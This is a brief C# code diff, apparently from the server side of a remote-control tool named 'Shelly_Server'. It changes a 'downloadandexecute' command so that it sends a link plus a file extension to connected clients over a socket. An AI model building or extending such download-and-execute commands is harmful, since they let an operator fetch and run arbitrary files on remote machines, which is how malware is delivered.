@@ -78,7 +78,7 @@ namespace Shelly_Server
                 case "downloadandexecute":
 
                     // Send message
-                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1));
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1) + " " + Functions.UserInput.GetExtentionInput());
                     break;
 
                 // Open website
